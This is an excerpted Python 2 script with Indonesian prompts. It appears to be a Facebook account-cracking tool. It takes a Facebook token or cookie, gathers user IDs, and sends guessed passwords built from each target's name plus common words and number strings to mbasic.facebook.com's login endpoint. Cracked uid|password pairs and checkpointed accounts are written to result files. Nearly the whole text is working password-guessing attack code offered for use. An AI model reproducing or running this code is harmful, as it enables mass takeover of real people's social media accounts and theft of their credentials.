...
def login():
	...
	try:
		...
		print(" "+N+"\n Diusahkan saat mengambil Cookies gunakan url: free.facebook.com agar tumbal Awet!\n")
...
def tokenz():
	...
	try:
		...
		token = raw_input(" \033[0;97m[\033[0;92m+\033[0;97m] Masukan Token : \033[44m")
		try:
...
def cookie():
	...
	cookie = raw_input(" "+N+"[+] Your Cookie : \033[44m")
	try:
...
def menu():
	...
	print(" "+N+"[2] Check Result")
	print(" "+N+"[3] Setting UserAgent")
	...
	if ask =="":
		...
		print("\n "+N+"[1] Crack Publik ( 5list sandi )")
	if ask =="":
		menu()
		print("\n "+N+" Crack publik menggunakan sandi default: Y/t")
		print(" "+N+" name123,name1234,name12345,firstname")
		ask = raw_input("\n "+N+"[?] Pilih : ")
		if ask =="":
			menu()
		elif ask == "Y" or ask == "y":
			...
			menu()
		print(" "+N+"[2] Crack Indonesia")
		print(" "+N+"[3] Crack India/Bangla")
		ask = raw_input("\n "+N+"[?] Pilih : ")
		if ask =="":
			menu()
		elif ask == "2" or ask == "02":
...
def __ahya_ganteng():
	...
	ask = raw_input("\n "+N+"[?] Apa kamu ingin menggunakan Manual sandi? Y/t : ")
	if ask == "Y" or ask == "y":
		manual()
...
def _dds():
	...
	for i in z["data"]:
		...
		id.append(uid+'|'+nm)
	print(" "+N+"[*] Total ID  : "+str(len(id)))
	print(" "+N+"[!] Waktu crack akan memakan waktu lama menggunakan 10list sandi")
	print(" "+N+"[!] Jika tidak sabar silahkan gunakan metode publik")
	print(" "+N+"[#] -------------------------------------------")
	ask = raw_input("\n "+N+"[?] Apa kamu ingin menggunakan Manual sandi? Y/t : ")
	if ask == "Y" or ask == "y":
		manual()
	...
	def main(user):
		...
		try:
			...
			pass
		try:
			for pw in [name.lower()+'123',name.lower()+'1234','indonesia',name.lower()+'12345','sayang',name.lower(),'bismillah','bangsat','123456','rahasia']:
				rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pw, 'login': 'submit'}, headers={'user-agent': ua})
				xo = rex.content
				if 'mbasic_logout_button' in xo or 'save-device' in xo:
					print('\r '+H+'[OK]' +N+'' +uid+ '|' +pw+ '                  ')
...
def _sarungan_():
	...
	def main(user):
		...
		try:
			...
			pass
		try:
			for pw in [name.lower()+'123',name.lower()+'1234',name.lower()+'12345',name.lower(),name.lower()+'786','102030','445566','111222','786786','000786']:
				rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pw, 'login': 'submit'}, headers={'user-agent': ua})
				xo = rex.content
				if 'mbasic_logout_button' in xo or 'save-device' in xo:
					print('\r '+H+'[OK]' +N+'' +uid+ '|' +pw+ '                  ')
...
def manual():
	print(" "+N+"[*] Terserah kamu jangan lupa kasih koma (,) tanpa spasi")
	...
	def main(user):
		...
		try:
			for lol in pw:
				...
				xo = rex.content
				if 'mbasic_logout_button' in xo or 'save-device' in xo:
					print('\r '+H+'[OK]' +N+'' +uid+ '|' +lol+ '                  ')
					ok.append(uid+'|'+lol)
					save = open('results/OK-%s-%s-%s.txt' % (ha, op, ta),'a') 
					save.write(str(uid)+'|'+str(lol)+'\n')
					save.close()
					break
					continue
				elif 'checkpoint' in xo:
					print('\r '+K+'[CP]' +N+'' +uid+ '|' +lol+ '                  ')
					cp.append(uid+'|'+lol)
					save = open('results/CP-%s-%s-%s.txt' % (ha, op, ta),'a') 
					save.write(str(uid)+'|'+str(lol)+'\n')
					save.close()
